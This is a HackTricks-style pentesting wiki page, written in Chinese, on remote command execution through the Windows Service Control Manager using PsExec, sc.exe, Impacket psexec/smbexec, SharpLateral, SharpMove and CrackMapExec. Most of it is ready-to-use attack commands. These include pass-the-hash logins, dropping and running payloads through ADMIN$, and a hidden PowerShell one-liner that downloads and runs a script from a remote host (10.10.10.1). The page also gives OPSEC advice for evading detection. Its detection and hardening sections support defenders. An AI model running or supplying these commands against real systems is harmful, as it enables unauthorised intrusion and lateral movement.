# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## 工作原理

这些技术会通过 SMB/RPC 远程滥用 Windows Service Control Manager (SCM)，在目标主机上执行命令。常见流程如下：

1. 验证身份并通过 SMB (TCP/445) 访问目标上的 ADMIN$ 共享。
2. 复制一个可执行文件，或指定服务将运行的 LOLBAS 命令行。
3. 通过 SCM (MS-SCMR over \PIPE\svcctl) 远程创建服务，并将其指向该命令或二进制文件。
4. 启动服务以执行 payload，并可选择通过命名管道捕获 stdin/stdout。
5. 停止服务并清理（删除服务和任何落地的二进制文件）。

要求/前提条件：
- 目标上的本地管理员权限 (SeCreateServicePrivilege)，或目标上明确授予的服务创建权限。
- SMB (445) 可连接，且 ADMIN$ 共享可用；主机防火墙允许远程服务管理。
- UAC 远程限制：使用本地帐户时，令牌筛选可能会阻止管理员通过网络访问，除非使用内置 Administrator 帐户，或设置 LocalAccountTokenFilterPolicy=1。
- Kerberos 与 NTLM：使用主机名/FQDN 可启用 Kerberos；通过 IP 连接通常会回退到 NTLM（在安全加固的环境中可能会被阻止）。

### 通过 sc.exe 手动使用 ScExec/WinExec

以下示例展示了最简的服务创建方式。服务映像可以是落地的 EXE，也可以是 cmd.exe 或 powershell.exe 之类的 LOLBAS。

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes:
- 启动非服务 EXE 时，预期会出现超时错误；但执行仍会发生。
- 为了更符合 OPSEC，优先使用无文件命令（cmd /c、powershell -enc），或删除落地的 artifacts。

更多详细步骤见：https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## 工具与示例

### Sysinternals PsExec.exe

- 经典的 admin 工具，使用 SMB 在 ADMIN$ 中放置 PSEXESVC.exe，安装临时服务（默认名称为 PSEXESVC），并通过命名管道代理 I/O。
- 用法示例：<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- 你可以通过 WebDAV 直接从 Sysinternals Live 启动：

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- 会留下服务安装/卸载事件（除非使用 -r，否则服务名称通常为 PSEXESVC），并在执行期间创建 C:\Windows\PSEXESVC.exe。

### Impacket psexec.py（类似 PsExec）

- 使用内嵌的 RemCom 类服务。通过 ADMIN$ 投放一个临时服务二进制文件（通常使用随机名称），创建服务（默认通常为 RemComSvc），并通过命名管道代理 I/O。

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artifacts
- C:\Windows\ 中的临时 EXE（随机 8 个字符）。服务名称默认为 RemComSvc，除非另行指定。

### Impacket smbexec.py (SMBExec)

- 创建一个临时服务来启动 cmd.exe，并使用 named pipe 进行 I/O。通常不会写入完整的 EXE payload；命令执行是半交互式的。

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral)（C#）实现了多种 lateral movement 方法，包括基于 service 的 exec。

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) 包含修改/创建服务以远程执行命令的功能。

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- 你也可以使用 CrackMapExec 通过不同的后端（psexec/smbexec/wmiexec）执行命令：

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC、检测与痕迹

使用类似 PsExec 的技术时，主机/网络上常见的痕迹：
- 目标上的 Security 4624（Logon Type 3）和 4672（Special Privileges）事件，显示所用管理员账户。
- Security 5140/5145 File Share 和 File Share Detailed 事件，显示对 ADMIN$ 的访问以及服务二进制文件（例如 PSEXESVC.exe 或随机的 8 字符 .exe 文件）的创建/写入。
- 目标上的 **System** 7045 事件，由 Service Control Manager 记录服务安装：服务名称可能是 PSEXESVC、RemComSvc 或自定义名称（`-r` / `-service-name`）。这能证明服务已安装，但不能证明其映像已运行。将事件时间戳和映像路径与进程事件或匹配的服务映像预取条目关联起来（如有）。<sup>[[4]](#references)</sup>
- Sysmon 1（Process Create）事件，记录 services.exe 或服务映像的进程创建；3（Network Connect）；11（File Create），记录 C:\Windows\ 中的文件创建；17/18（Pipe Created/Connected），记录 \\.\pipe\psexesvc、\\.\pipe\remcom_* 或随机生成的同类管道。
- Sysinternals EULA 的注册表痕迹：操作员主机上的 HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（未抑制时）。

狩猎思路
- 对 ImagePath 包含 cmd.exe /c、powershell.exe 或 TEMP 路径的服务安装触发告警。
- 查找 ParentImage 为 C:\Windows\PSEXESVC.exe 的进程创建事件，或 services.exe 的子进程以 LOCAL SYSTEM 身份运行 shell 的情况。
- 标记以 -stdin/-stdout/-stderr 结尾的命名管道，或已知 PsExec 克隆版使用的管道名称。

## 常见故障排查
- 创建服务时出现 Access is denied (5)：可能并非真正的本地管理员账户、受 UAC 远程限制影响的本地账户，或 EDR 正在保护服务二进制文件路径免遭篡改。
- 出现 The network path was not found (53)，或无法连接到 ADMIN$：可能是防火墙阻止了 SMB/RPC，或管理员共享已禁用。
- Kerberos 失败但 NTLM 被阻止：使用主机名/FQDN（而非 IP）连接，确保 SPN 正确；使用 Impacket 时，也可以通过票据指定 -k/-no-pass。
- 服务启动超时但 payload 已运行：若使用的并非真正的服务二进制文件，这属于预期情况；可将输出捕获到文件，或使用 smbexec 实时收发 I/O。

## 加固说明
- Windows 11 24H2 和 Windows Server 2025 默认要求出站 SMB 连接（以及 Windows 11 的入站连接）使用 SMB signing。使用有效凭据时，这不会影响合法的 PsExec 使用，但能防止未签名的 SMB relay 滥用，也可能影响不支持签名的设备。<sup>[[2]](#references)</sup>
- 新增的 SMB client NTLM blocking（Windows 11 24H2/Server 2025）可能会在通过 IP 或连接到非 Kerberos 服务器时阻止 NTLM 回退。在已加固的环境中，这会导致基于 NTLM 的 PsExec/SMBExec 失效；如有合法需要，请使用 Kerberos（主机名/FQDN）或配置例外。<sup>[[2]](#references)</sup>
- 最小权限原则：尽量减少本地管理员成员，优先采用 Just-in-Time/Just-Enough Admin，强制使用 LAPS，并监控/告警 7045 服务安装事件。

## 另请参阅

- 基于 WMI 的远程执行（通常更少依赖文件）：

{{#ref}}
./wmiexec.md
{{#endref}}

- 基于 WinRM 的远程执行：

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 和 Windows 11 中的 SMB 安全加固](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [使用凭据控制 Windows 主机 - 第 2 部分（PSExec 和服务）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – 使用系统事件日志排查意外重启问题](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
